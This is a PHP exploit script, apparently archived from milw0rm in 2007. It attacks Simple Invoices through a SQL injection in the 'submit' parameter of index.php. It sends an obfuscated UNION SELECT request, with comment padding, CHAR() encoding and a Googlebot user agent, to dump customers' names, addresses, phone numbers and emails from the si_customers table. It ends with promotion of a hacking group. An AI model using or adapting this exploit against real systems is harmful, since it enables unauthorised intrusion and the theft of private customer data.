<?/*
Exploit Name: Simple Invoices 2007 05 25 (index.php submit) Remote SQL Injection Exploit
Script homepage/download/demo: http://simpleinvoices.org/

Discovered by: Kacper (kacper1964@yahoo.pl)
Kacper Hacking & Security Blog: http://kacper.bblog.pl/

^()* => Homepage: http://devilteam.eu/ <= *()^

Irc: irc.milw0rm.com:6667 #devilteam 

Pozdro dla wszystkich ludzi z #devilteam oraz devilteam.eu/forum !!
*/
if ($argc<4) {
print_r('
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Usage: php '.$argv[0].' host path user_id OPTIONS
host:       target server (ip/hostname)
path:       Simple_Invoices path
user_id:    Customer ID :)
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' 127.0.0.1 /Simple_Invoices/ 1
php '.$argv[0].' 127.0.0.1 /Simple_Invoices/ 2 -P1.1.1.1:80
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
');
die;
}
error_reporting(7);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);
function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function wyslijpakiet($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    $parts[1]=(int)$parts[1];
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}
$host=$argv[1];
$path=$argv[2];
$user_id=$argv[3];
$prefix="";
$port=80;
$proxy="";
for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp=="-p")
{
  $port=(int)str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {die("Bad path!");}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
function char_convert($my_string)
{
  $encoded="CHAR(";
  for ($k=0; $k<=strlen($my_string)-1; $k++)
  {
    $encoded.=ord($my_string[$k]);
    if ($k==strlen($my_string)-1) {$encoded.=")";}
    else {$encoded.=",";}
  }
  return $encoded;
}
print "++++++++++++++++++++++ START ++++++++++++++++++++\r\n";
$packet ="GET ".$p."index.php?module=invoices&view=email&stage=1&submit=-1/*+DEVIL+TEAM+*/union/*+devilteam.eu+*/select/*+POLISH+TEAM+*/CONCAT(".char_convert("<DEVIL_TEAM-[").",name,".char_convert(":").",street_address,".char_convert(":").",street_address2,".char_convert(":").",city,".char_convert(":").",state,".char_convert(":").",country,".char_convert(":").",phone,".char_convert(":").",mobile_phone,".char_convert(":").",email,".char_convert("]-Kacper>")."),1,2,3,4,5,6,7,8,9,10/**/FROM/*table=>*/si_customers/*+and+*/WHERE/*+user+ID+*/id=".$user_id."/* HTTP/1.0\r\n";
$packet.="Referer: http://".$host.$path."index.php\r\n";
$packet.="Accept-Language: pl\r\n";
$packet.="User-Agent: Googlebot/2.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
wyslijpakiet($packet);
sleep(3);
$t=explode("<DEVIL_TEAM-[",$html);
$t2=explode("]-Kacper>",$t[1]);
$calosc=$t2[0];
$dane=explode(":",$calosc);
echo "Customer Name: ".$dane[0]."\r\n";
echo "Customer Street: ".$dane[1]."\r\n";
echo "Customer Street address 2: ".$dane[2]."\r\n";
echo "Customer City: ".$dane[3]."\r\n";
echo "Customer State: ".$dane[4]."\r\n";
echo "Customer Country: ".$dane[5]."\r\n";
echo "Customer Phone: ".$dane[6]."\r\n";
echo "Customer Mobile Phone: ".$dane[7]."\r\n";
echo "Customer Email: ".$dane[8]."\r\n";
print "++++++++++++++++++++++ DONE ++++++++++++++++++++\r\n";
echo "Go to DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam\r\n";
echo "DEVIL TEAM HOME: http://devilteam.eu/\r\n";
?>

# milw0rm.com [2007-06-24]